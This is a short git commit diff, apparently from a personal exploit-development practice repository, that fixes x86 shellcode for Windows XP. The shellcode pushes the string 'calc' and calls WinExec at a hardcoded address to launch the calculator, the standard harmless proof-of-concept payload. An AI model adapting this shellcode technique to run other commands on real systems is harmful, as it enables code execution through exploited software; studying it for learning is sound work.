231f7aa7077476e571b88726bfebdd9b4a77b68c
juzzrespecter <danisarp@gmail.com>
2022-07-26 19:42:23 +0200

    WinXP: working shellcode

--- WinXP/shellcode/shellcode.s
+++ WinXP/shellcode/shellcode.s
@@ -4,8 +4,7 @@
 _payload:
 	xor	eax,eax
 	push	eax		; null byte && uCmdShow
-	mov	ebx,0x636c6163	; 'calc'...
-	push	ebx		; ..a la pila
+	push	0x636c6163	; 'calc' a la pila
 	push	esp	   	; lpCmdLine = PTR 'calc.exe'
 	mov	eax,0x7c8623ad	; PTR WinExec (via arwin.exe)
-	call	0x7c8623ad
+	call	eax
